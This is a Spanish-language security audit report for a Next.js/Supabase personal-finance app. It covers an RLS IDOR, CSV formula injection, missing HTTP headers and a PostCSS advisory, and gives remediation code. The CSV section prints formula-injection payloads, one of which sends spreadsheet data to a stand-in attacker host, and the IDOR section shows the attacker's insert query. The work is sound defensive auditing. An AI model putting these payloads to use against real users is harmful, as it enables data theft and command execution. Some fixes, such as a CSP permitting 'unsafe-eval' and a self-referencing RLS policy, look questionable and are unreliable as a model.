# INFORME DE AUDITORÍA EXHAUSTIVA DE CIBERSEGURIDAD
## Aplicación Web FinTech: FinPulse (Next.js 15 + Supabase + Tailwind CSS)

**Fecha:** 3 de Septiembre de 2026  
**Auditor:** Especialista Senior en Ciberseguridad & FinTech Application Security  
**Clasificación:** Confidencial / Evaluación de Seguridad Defensiva  
**Versión del Software Auditado:** FinPulse v0.1.0 (Next.js 15.1.7, React 19, Supabase SSR 0.5.2)  

---

## 1. RESUMEN EJECUTIVO

Se ha llevado a cabo una auditoría integral y multidimensional de seguridad sobre el código fuente, la arquitectura de base de datos, la configuración de infraestructura y las dependencias de **FinPulse**.

### Diagnóstico Global de la Postura de Seguridad
- **Protección de Secretos y Variables de Entorno (Excelente):** La variable `SUPABASE_SERVICE_ROLE_KEY` no se encuentra expuesta en el frontend ni en `NEXT_PUBLIC_*`. El archivo `.env.local` se encuentra correctamente excluido por `.gitignore` y el historial de Git está limpio de filtraciones de credenciales maestras.
- **Renderizado React y XSS (Bueno):** No se detectaron vectores directos de XSS mediante `dangerouslySetInnerHTML`, `eval()`, o manipulación insegura del DOM. El motor JSX escapa correctamente notas y descripciones.
- **Riesgo Crítico en Políticas RLS (Row-Level Security) de Supabase (Crítico):** Se identificó una vulnerabilidad de **Insecure Direct Object Reference (IDOR)** y autorización rota en la tabla `goal_members` que permitiría a cualquier usuario autenticado adherirse a metas de ahorro privadas de otros usuarios y obtener acceso de lectura a sus importes financieros acumulados.
- **Inyección de Fórmulas CSV / Spreadsheet Injection (Alto):** La función de exportación de reportes a archivo CSV en `src/components/reports/ReportsView.tsx` no neutraliza caracteres ejecutables (`=`, `+`, `-`, `@`), lo que expone a los usuarios a ejecución remota de comandos o robo de datos al abrir reportes en Microsoft Excel o Google Sheets.
- **Cabeceras HTTP y Protección del Perímetro Web (Alto):** `next.config.ts` carece de cabeceras HTTP de seguridad (`Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`), dejando a la aplicación expuesta a ataques de Clickjacking y enlaces no restringidos.
- **Dependencias Vulnerables (Medio):** `npm audit` reportó 2 vulnerabilidades (1 alta, 1 moderada) en versiones internas de `postcss <=8.5.22` vinculadas a Next.js. El impacto real en producción es mitigable vía overrides de paquetes sin romper dependencias.
- **Integridad de Datos en Cliente (Medio):** El almacenamiento en `localStorage` se deserializa mediante `JSON.parse()` sin validación mediante esquemas Zod (a pesar de tener la librería instalada).

---

## 2. MATRIZ DE RIESGOS Y CLASIFICACIÓN DE VULNERABILIDADES

| ID | Hallazgo / Vulnerabilidad | Severidad (CVSS v3.1) | Categoría OWASP | Estado |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | IDOR y Fuga de Metas Privadas por Políticas RLS en `goal_members` | **CRÍTICA (8.8)** | A01:2021 - Broken Access Control | Documentado & Solución provista |
| **SEC-02** | Inyección de Fórmulas CSV (CWE-1236) en Exportación de Reportes | **ALTA (7.8)** | A03:2021 - Injection | Documentado & Solución provista |
| **SEC-03** | Ausencia Total de Cabeceras HTTP de Seguridad (CSP, HSTS, X-Frame) | **ALTA (7.5)** | A05:2021 - Security Misconfiguration | Documentado & Solución provista |
| **SEC-04** | Dependencia Vulnerable PostCSS en el árbol de Next.js (GHSA-qx2v-qp2m-jg93) | **MEDIA (5.3)** | A06:2021 - Vulnerable Components | Documentado & Solución provista |
| **SEC-05** | Instanciación Múltiple de `createBrowserClient` (Sin Singleton) | **MEDIA (4.8)** | A04:2021 - Insecure Design | Documentado & Solución provista |
| **SEC-06** | Deserialización Insegura de `localStorage` sin Validación Zod | **MEDIA (4.3)** | A08:2021 - Software & Data Integrity | Documentado & Solución provista |
| **SEC-07** | Falta de `WITH CHECK` y `search_path` en Funciones/Triggers Postgres | **MEDIA (4.2)** | A01:2021 - Broken Access Control | Documentado & Solución provista |
| **SEC-08** | Falta de Límite de Longitud (DoS/ReDoS) y Manejo de `Infinity` en Montos | **BAJA (3.3)** | A04:2021 - Insecure Design | Documentado & Solución provista |

---

## 3. AUDITORÍA DETALLADA POR COMPONENTE

### 3.1. Variables de Entorno y Configuración de Supabase
- **Inspección de Archivos:** `.env.local`, `.env.example`, `src/lib/supabase/client.ts`.
- **Hallazgo Positivo:**
  - `NEXT_PUBLIC_SUPABASE_ANON_KEY` contiene una clave de tipo publishable anon key (`sb_publishable_...`).
  - La clave `SUPABASE_SERVICE_ROLE_KEY` **NO** tiene el prefijo `NEXT_PUBLIC_` en `.env.example` y **NO** existe en `.env.local` ni se incluye en ningún bundle del cliente.
  - La clave de orquestación `VERCEL_OIDC_TOKEN` no tiene prefijo `NEXT_PUBLIC_`.
  - `.gitignore` contiene las reglas `.env*.local` y `.env*`, previniendo subidas involuntarias a repositorios públicos.
  - El historial git (`git log`) fue revisado y no contiene commits con credenciales filtradas.
- **Oportunidad de Mejora:** Crear un archivo `src/env.ts` utilizando Zod para validar en tiempo de compilación (`build`) la presencia y formato de las variables requeridas.

---

### 3.2. Conexiones y Clientes Supabase (`src/lib/supabase/client.ts`)
- **Problema de Arquitectura Detectado:**
  En `src/lib/supabase/client.ts`:
  ```typescript
  export function createClient() {
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
    const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
    return createBrowserClient(supabaseUrl, supabaseAnonKey);
  }
  ```
- **Riesgo:** Cada componente que invoca `createClient()` (por ejemplo, llamadas simultáneas en `page.tsx`, `AuthModal.tsx`, etc.) genera una nueva instancia de cliente Supabase. En `@supabase/ssr`, esto duplica listeners de autenticación en memoria, conexiones WebSocket y administradores de almacenamiento de cookies/tokens, facilitando condiciones de carrera (*race conditions*) y fugas de memoria.
- **Remediación:** Implementar el patrón **Singleton**.

---

### 3.3. Auditoría de Seguridad RLS en Base de Datos (`src/lib/supabase/schema.sql`)

#### Vulnerabilidad Crítica SEC-01: IDOR en Metas Compartidas
En `schema.sql`:
```sql
CREATE POLICY "Miembros pueden ver y actualizar su aporte"
  ON public.goal_members FOR ALL
  USING (auth.uid() = user_id);

CREATE POLICY "Miembros pueden ver metas compartidas en las que participan"
  ON public.savings_goals FOR SELECT
  USING (
    auth.uid() = creator_id OR
    EXISTS (SELECT 1 FROM public.goal_members gm WHERE gm.goal_id = savings_goals.id AND gm.user_id = auth.uid())
  );
```
**Análisis del Vector de Ataque:**
1. Un atacante autenticado (con cuenta válida) descubre o enumera un `goal_id` (UUID de meta de ahorro perteneciente a otro usuario).
2. El atacante ejecuta un query directo:
   `INSERT INTO public.goal_members (goal_id, user_id) VALUES ('<uuid-victima>', auth.uid());`
3. Como la política RLS en `goal_members` solo verifica `auth.uid() = user_id`, la inserción es **exitosa**, incluso si la meta es privada (`is_collaborative = FALSE`) o requiere un código de invitación no suministrado.
4. Con esa fila insertada, la política de `savings_goals` evalúa `EXISTS (...)` como verdadera, otorgando al atacante acceso de lectura inmediato sobre el monto acumulado, monto objetivo, título y fechas de la meta privada de la víctima.
5. Además, la política actual prohíbe que el creador de la meta o sus compañeros lean las filas de los demás miembros (`auth.uid() = user_id`), rompiendo la tabla de posiciones colaborativa en la UI.

#### Vulnerabilidad SEC-07: Falta de `WITH CHECK` y `search_path` en Triggers
1. **Falta de `WITH CHECK` explícito:** Las políticas de `accounts` y `transactions` utilizan `FOR ALL USING (auth.uid() = user_id)`. Se debe forzar explícitamente `WITH CHECK (auth.uid() = user_id)` para asegurar que ninguna inserción o actualización permita alterar la titularidad del registro.
2. **Falta de validación cruzada de cuentas:** En `transactions`, no se valida que `account_id` pertenezca al mismo `user_id` del usuario que registra el movimiento, posibilitando la asociación indebida de transacciones a cuentas bancarias ajenas.
3. **Trigger `handle_new_user`:** La función `SECURITY DEFINER` no especifica `SET search_path = public, pg_temp;`. En PostgreSQL, no aislar el `search_path` en funciones con privilegios elevados expone la base de datos a ataques de secuestro de esquemas (Trojan schema).

---

### 3.4. Auditoría de Inyección (XSS, CSV Formula Injection, NLP)

#### Vulnerabilidad Alta SEC-02: Inyección de Fórmulas en Exportación CSV
En `src/components/reports/ReportsView.tsx` (líneas 219-235):
```typescript
const rows = filteredTransactions.map((t) => [
  t.id,
  t.transactedAt,
  t.type,
  `"${t.description.replace(/"/g, '""')}"`,
  t.category,
  t.amount,
  t.accountName || "",
  t.isAntExpense ? "SI" : "NO",
  t.goalTitle || "",
]);
```
- **Riesgo:** Si un atacante o usuario registra una transacción con descripción o nombre de cuenta que inicie con `=`, `+`, `-`, `@`, `\t` o `\r` (por ejemplo, `=CMD|'/C calc'!A0` o `=HYPERLINK("https://malicious-server.com/leak?data="&A1; "Click")`), el programa de hoja de cálculo del destinatario (Excel o LibreOffice) lo interpretará como una **fórmula ejecutable**.
- Además, `accountName` y `goalTitle` no estaban entrecomillados; si contienen comas o saltos de línea, la estructura tabular del CSV se corrompe.
- El uso de `encodeURI` sobre Data URLs falla ante cadenas que contengan `#` y tiene límites estrictos de tamaño en navegadores móviles. Se debe utilizar `Blob` y `URL.createObjectURL()`.

#### Análisis de XSS en UI y Parser NLP (`src/lib/ai/parser.ts`)
- **React Escaping:** Todos los campos de texto (`description`, `notes`, `accountName`) se renderizan utilizando expresiones de React `{tx.description}`. React trata estas entradas como cadenas de texto puro y no interpreta etiquetas HTML.
- **Sin `dangerouslySetInnerHTML`:** La búsqueda en todo el código confirmó cero ocurrencias de `dangerouslySetInnerHTML` o llamadas a `eval()`.
- **Motor NLP (`parseTransactionTextLocally`):**
  - Es heurístico local, sin inyección a modelos externos por el momento.
  - **Recomendación:** Limitar la longitud máxima del texto de entrada (`rawText.slice(0, 500)`) para mitigar ataques de denegación de servicio por procesamiento de expresiones regulares (ReDoS) o sobrecarga del hilo principal.
- **Monto y Valores No Finitos:**
  - En `TransactionFormModal.tsx`, `parseFloat(amount)` no valida `Number.isFinite(num)` ni comprueba valores absurdos (`Infinity`, `1e308`), lo que puede causar desbordamientos numéricos en columnas `NUMERIC(14,2)`.

---

### 3.5. Auditoría de Dependencias (`npm.cmd audit`)
El análisis de dependencias mediante `npm.cmd audit` arrojó el siguiente resultado:
```
# npm audit report
postcss  <=8.5.22
Severity: high
PostCSS has XSS via Unescaped </style> in its CSS Stringify Output - GHSA-qx2v-qp2m-jg93
PostCSS: Arbitrary file read and info disclosure via sourceMappingURL - GHSA-6g55-p6wh-862q
node_modules/next/node_modules/postcss
  next  9.3.4-canary.0 - 16.3.0-preview.10
2 vulnerabilities (1 moderate, 1 high)
```
- **Impacto Real en FinPulse:** **Bajo a Moderado.**
  La vulnerabilidad de PostCSS se produce cuando la herramienta procesa código CSS o mapas de fuentes (*source maps*) no confiables suministrados por usuarios externos. En FinPulse, PostCSS se ejecuta exclusivamente en tiempo de compilación (`next build`) sobre estilos propios del desarrollador (Tailwind CSS). No existe ningún endpoint que acepte CSS arbitrario de usuarios finales.
- **Solución Recomendada:** No forzar `npm audit fix --force` (lo cual intentaría instalar una versión inestable de Next.js 16 con cambios incompatibles). La solución limpia consiste en agregar un bloque `overrides` en `package.json` para fijar `postcss` a `>=8.5.26`.

---

### 3.6. Cabeceras de Seguridad HTTP y Persistencia en `localStorage`

#### Vulnerabilidad Alta SEC-03: Ausencia de Cabeceras HTTP
`next.config.ts` actualmente carece del bloque `headers()`. Sin estas cabeceras:
1. **Clickjacking:** FinPulse puede ser embebida en un `<iframe>` malicioso en otro sitio web, permitiendo engañar al usuario para confirmar gastos o borrar cuentas.
2. **Sin Content Security Policy (CSP):** No hay directivas que limiten hacia dónde puede conectarse la aplicación (`connect-src`), ni de dónde puede cargar imágenes o scripts.
3. **Falta de HSTS:** No se fuerza HTTPS con `Strict-Transport-Security`.

#### Persistencia en `localStorage` (SEC-06)
1. **Falta de Validación de Esquema:** `page.tsx` carga transacciones, cuentas y metas directamente con `JSON.parse(savedTx)` sin validación Zod. Cualquier modificación externa en la consola del navegador o por una extensión maliciosa podría inyectar datos anómalos y quebrar la lógica financiera de la aplicación.
2. **Consideración FinTech:** Los saldos bancarios y números de tarjeta simulados residen en `localStorage`. Si bien para una PWA local-first esto brinda disponibilidad sin conexión, en un entorno de producción conectado a cuentas bancarias reales, las credenciales y tokens de acceso deben gestionarse exclusivamente mediante cookies `HttpOnly; Secure; SameSite=Lax`.

---

## 4. GUÍA DE REMEDIACIÓN Y CÓDIGO CORREGIDO

A continuación se presentan las implementaciones listas para ser integradas en el proyecto.

### 4.1. Cabeceras de Seguridad HTTP en `next.config.ts`
Reemplazar la configuración de `next.config.ts` con el siguiente código endurecido:

```typescript
import type { NextConfig } from "next";

const securityHeaders = [
  {
    key: "X-DNS-Prefetch-Control",
    value: "on",
  },
  {
    key: "Strict-Transport-Security",
    value: "max-age=63072000; includeSubDomains; preload",
  },
  {
    key: "X-Frame-Options",
    value: "DENY",
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
  {
    key: "Permissions-Policy",
    value: "camera=(), microphone=(self), geolocation=(), payment=()",
  },
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob: https://lh3.googleusercontent.com https://images.unsplash.com",
      "font-src 'self' data:",
      "connect-src 'self' https://*.supabase.co wss://*.supabase.co https://generativelanguage.googleapis.com https://api.groq.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join("; "),
  },
];

const nextConfig: NextConfig = {
  reactStrictMode: true,
  images: {
    remotePatterns: [
      {
        protocol: "https",
        hostname: "lh3.googleusercontent.com",
      },
      {
        protocol: "https",
        hostname: "images.unsplash.com",
      },
    ],
  },
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: securityHeaders,
      },
    ];
  },
};

export default nextConfig;
```

---

### 4.2. Corrección del Cliente Supabase Singleton (`src/lib/supabase/client.ts`)
Evitar la regeneración de clientes y fuga de memoria:

```typescript
import { createBrowserClient } from "@supabase/ssr";

let clientInstance: ReturnType<typeof createBrowserClient> | null = null;

export function createClient() {
  if (clientInstance) return clientInstance;

  const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

  if (!supabaseUrl || !supabaseAnonKey) {
    throw new Error(
      "Configuración incompleta: NEXT_PUBLIC_SUPABASE_URL y NEXT_PUBLIC_SUPABASE_ANON_KEY son requeridas."
    );
  }

  clientInstance = createBrowserClient(supabaseUrl, supabaseAnonKey);
  return clientInstance;
}
```

---

### 4.3. Script SQL Endurecido para Supabase (`schema.sql`)
Corrige la vulnerabilidad IDOR en metas compartidas, asegura triggers y políticas:

```sql
-- ==============================================================================
-- FINPULSE: POLÍTICAS RLS Y ESQUEMA CORREGIDO (SEGURIDAD REFORZADA)
-- ==============================================================================

-- 1. EXTENSIONES
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- 2. TABLA: PROFILES
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  display_name TEXT,
  avatar_url TEXT,
  currency TEXT DEFAULT 'ARS',
  coach_mode TEXT DEFAULT 'encouraging' CHECK (coach_mode IN ('zen', 'encouraging', 'strict')),
  email_digest_enabled BOOLEAN DEFAULT TRUE,
  streak_ant_expenses_count INTEGER DEFAULT 0,
  last_streak_date DATE,
  monthly_streak_freeze_available BOOLEAN DEFAULT TRUE,
  total_rescued_money NUMERIC(14,2) DEFAULT 0.00,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Los usuarios pueden ver su propio perfil" ON public.profiles;
CREATE POLICY "Los usuarios pueden ver su propio perfil y el de companeros de meta"
  ON public.profiles FOR SELECT
  USING (
    auth.uid() = id OR
    EXISTS (
      SELECT 1 FROM public.goal_members gm1
      JOIN public.goal_members gm2 ON gm1.goal_id = gm2.goal_id
      WHERE gm1.user_id = auth.uid() AND gm2.user_id = profiles.id
    )
  );

DROP POLICY IF EXISTS "Los usuarios pueden actualizar su propio perfil" ON public.profiles;
CREATE POLICY "Los usuarios pueden actualizar su propio perfil"
  ON public.profiles FOR UPDATE
  USING (auth.uid() = id)
  WITH CHECK (auth.uid() = id);

DROP POLICY IF EXISTS "Los usuarios pueden insertar su propio perfil" ON public.profiles;
CREATE POLICY "Los usuarios pueden insertar su propio perfil"
  ON public.profiles FOR INSERT
  WITH CHECK (auth.uid() = id);

-- 3. TRIGGER SEGURO CON search_path
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER
SECURITY DEFINER
SET search_path = public, pg_temp
AS $$
BEGIN
  INSERT INTO public.profiles (id, display_name, avatar_url)
  VALUES (
    NEW.id,
    COALESCE(NEW.raw_user_meta_data->>'full_name', NEW.raw_user_meta_data->>'name', split_part(NEW.email, '@', 1)),
    NEW.raw_user_meta_data->>'avatar_url'
  );
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- 4. TABLA: ACCOUNTS
CREATE TABLE IF NOT EXISTS public.accounts (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  name TEXT NOT NULL,
  account_type TEXT NOT NULL CHECK (account_type IN ('cash', 'bank', 'wallet', 'credit_card')),
  balance NUMERIC(14,2) DEFAULT 0.00,
  closing_day INTEGER CHECK (closing_day BETWEEN 1 AND 31),
  due_day INTEGER CHECK (due_day BETWEEN 1 AND 31),
  color_hex TEXT DEFAULT '#10b981',
  card_network TEXT,
  last_four_digits TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.accounts ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Los usuarios pueden gestionar sus propias cuentas" ON public.accounts;
CREATE POLICY "Los usuarios gestionan sus cuentas con integridad"
  ON public.accounts FOR ALL
  USING (auth.uid() = user_id)
  WITH CHECK (auth.uid() = user_id);

-- 5. TABLA: TRANSACTIONS (Con verificación cruzada de cuenta)
CREATE TABLE IF NOT EXISTS public.transactions (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  account_id UUID REFERENCES public.accounts(id) ON DELETE SET NULL,
  type TEXT NOT NULL CHECK (type IN ('expense', 'income', 'saving_transfer')),
  amount NUMERIC(14,2) NOT NULL CHECK (amount > 0 AND amount <= 999999999.99),
  category TEXT NOT NULL,
  description TEXT NOT NULL,
  notes TEXT,
  is_ant_expense BOOLEAN DEFAULT FALSE,
  installments_total INTEGER DEFAULT 1 CHECK (installments_total >= 1 AND installments_total <= 60),
  installment_current INTEGER DEFAULT 1 CHECK (installment_current >= 1),
  statement_date DATE,
  transacted_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.transactions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Los usuarios pueden gestionar sus propias transacciones" ON public.transactions;
CREATE POLICY "Los usuarios gestionan sus transacciones con verificación de cuenta"
  ON public.transactions FOR ALL
  USING (auth.uid() = user_id)
  WITH CHECK (
    auth.uid() = user_id AND
    (account_id IS NULL OR EXISTS (SELECT 1 FROM public.accounts a WHERE a.id = account_id AND a.user_id = auth.uid()))
  );

-- 6. TABLA: SAVINGS_GOALS
CREATE TABLE IF NOT EXISTS public.savings_goals (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  creator_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  title TEXT NOT NULL,
  target_amount NUMERIC(14,2) NOT NULL CHECK (target_amount > 0),
  current_amount NUMERIC(14,2) DEFAULT 0.00 CHECK (current_amount >= 0),
  target_date DATE,
  is_collaborative BOOLEAN DEFAULT FALSE,
  invite_code TEXT UNIQUE,
  category_icon TEXT DEFAULT 'Trophy',
  color_hex TEXT DEFAULT '#06b6d4',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.savings_goals ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Creadores pueden gestionar sus metas" ON public.savings_goals;
CREATE POLICY "Creadores gestionan metas"
  ON public.savings_goals FOR ALL
  USING (auth.uid() = creator_id)
  WITH CHECK (auth.uid() = creator_id);

DROP POLICY IF EXISTS "Miembros pueden ver metas compartidas en las que participan" ON public.savings_goals;
CREATE POLICY "Lectura de metas compartidas"
  ON public.savings_goals FOR SELECT
  USING (
    auth.uid() = creator_id OR
    EXISTS (
      SELECT 1 FROM public.goal_members gm
      WHERE gm.goal_id = savings_goals.id AND gm.user_id = auth.uid()
    )
  );

-- 7. TABLA: GOAL_MEMBERS (Corrección de IDOR y Lectura Colectiva)
CREATE TABLE IF NOT EXISTS public.goal_members (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  goal_id UUID NOT NULL REFERENCES public.savings_goals(id) ON DELETE CASCADE,
  user_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  contributed_amount NUMERIC(14,2) DEFAULT 0.00 CHECK (contributed_amount >= 0),
  joined_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(goal_id, user_id)
);

ALTER TABLE public.goal_members ENABLE ROW LEVEL SECURITY;

-- Ver miembros de la misma meta
DROP POLICY IF EXISTS "Miembros pueden ver y actualizar su aporte" ON public.goal_members;
CREATE POLICY "Miembros y creador pueden ver los aportes de su equipo"
  ON public.goal_members FOR SELECT
  USING (
    auth.uid() = user_id OR
    EXISTS (
      SELECT 1 FROM public.savings_goals sg
      WHERE sg.id = goal_members.goal_id AND sg.creator_id = auth.uid()
    ) OR
    EXISTS (
      SELECT 1 FROM public.goal_members gm_peer
      WHERE gm_peer.goal_id = goal_members.goal_id AND gm_peer.user_id = auth.uid()
    )
  );

-- Unirse solo a metas colaborativas activas (Protección Anti-IDOR)
CREATE POLICY "Usuarios pueden unirse solo a metas colaborativas legitimas"
  ON public.goal_members FOR INSERT
  WITH CHECK (
    auth.uid() = user_id AND
    EXISTS (
      SELECT 1 FROM public.savings_goals sg
      WHERE sg.id = goal_id AND sg.is_collaborative = TRUE
    )
  );

-- Actualizar únicamente el aporte propio
CREATE POLICY "Usuarios actualizan unicamente su propio aporte"
  ON public.goal_members FOR UPDATE
  USING (auth.uid() = user_id)
  WITH CHECK (auth.uid() = user_id);

-- Salir de una meta
CREATE POLICY "Usuarios pueden abandonar una meta"
  ON public.goal_members FOR DELETE
  USING (auth.uid() = user_id);
```

---

### 4.4. Sanitización contra Inyección CSV (`src/components/reports/ReportsView.tsx`)
Implementar la función de escape que neutraliza el disparo de fórmulas y encapsula las celdas de forma robusta con `Blob`:

```typescript
// Helper de Neutralización de Inyección de Fórmulas CSV (CWE-1236)
function sanitizeCsvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return '""';
  let str = String(value);

  // Si comienza con un carácter de fórmula (=, +, -, @, tab, retorno), prefijar con apóstrofe (')
  if (/^[\=\+\-\@\t\r]/.test(str)) {
    str = `'${str}`;
  }

  // Escapar comillas dobles existentes y envolver entre comillas
  return `"${str.replace(/"/g, '""')}"`;
}

// Función de exportación segura
const handleExportCSV = () => {
  hapticTap();
  const headers = [
    "ID",
    "Fecha",
    "Tipo",
    "Descripción",
    "Categoría",
    "Monto",
    "Cuenta",
    "Es Gasto Hormiga",
    "Meta de Ahorro",
  ].map(sanitizeCsvCell);

  const rows = filteredTransactions.map((t) => [
    sanitizeCsvCell(t.id),
    sanitizeCsvCell(t.transactedAt),
    sanitizeCsvCell(t.type),
    sanitizeCsvCell(t.description),
    sanitizeCsvCell(t.category),
    t.amount, // numérico seguro
    sanitizeCsvCell(t.accountName || "General"),
    sanitizeCsvCell(t.isAntExpense ? "SI" : "NO"),
    sanitizeCsvCell(t.goalTitle || ""),
  ]);

  const csvContent =
    "\uFEFF" + [headers.join(","), ...rows.map((r) => r.join(","))].join("\r\n");

  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.setAttribute("href", url);
  link.setAttribute(
    "download",
    `finpulse_reporte_${timeRange}_${new Date().toISOString().split("T")[0]}.csv`
  );
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
};
```

---

### 4.5. Resolución de Vulnerabilidad PostCSS (`package.json`)
Agregar en `package.json` la propiedad `overrides` para forzar a todas las dependencias hijas (incluyendo Next.js) a utilizar la versión emparchada de `postcss`:

```json
"overrides": {
  "postcss": "^8.5.26"
}
```
Posteriormente, ejecutar `npm.cmd install` para actualizar el árbol sin provocar incompatibilidades mayores de versión.

---

## 5. CONCLUSIÓN Y RECOMENDACIONES FINALES

1. **Prioridad Inmediata:**
   - Aplicar el script de RLS en el SQL Editor de Supabase para cerrar la brecha IDOR en metas compartidas.
   - Reemplazar la rutina de exportación CSV en `ReportsView.tsx` para neutralizar inyección de fórmulas en hojas de cálculo.
   - Incorporar las cabeceras HTTP de seguridad en `next.config.ts`.
2. **Prioridad Media:**
   - Convertir `src/lib/supabase/client.ts` en un Singleton.
   - Definir esquemas `zod` para validar la carga de datos desde `localStorage` al iniciar la aplicación.
   - Configurar `overrides` para `postcss` en `package.json`.
3. **Hoja de Ruta FinTech (Fase 2):**
   - Transicionar las mutaciones de saldos y aportes a metas compartidas a funciones RPC de PostgreSQL con control transaccional (`BEGIN / COMMIT`) para prevenir saldos inconsistentes en caso de concurrencia.
   - Configurar en el Dashboard de Supabase listas estrictas de URLs de redirección para OAuth/Magic Links descartando cualquier comodín (`*`).

FinPulse demuestra sólidas prácticas en el manejo de variables públicas y renderizado React. La adopción de las mitigaciones propuestas consolidará una arquitectura de seguridad de nivel bancario, resiliente frente a los vectores de ataque más comunes en aplicaciones financieras modernas.
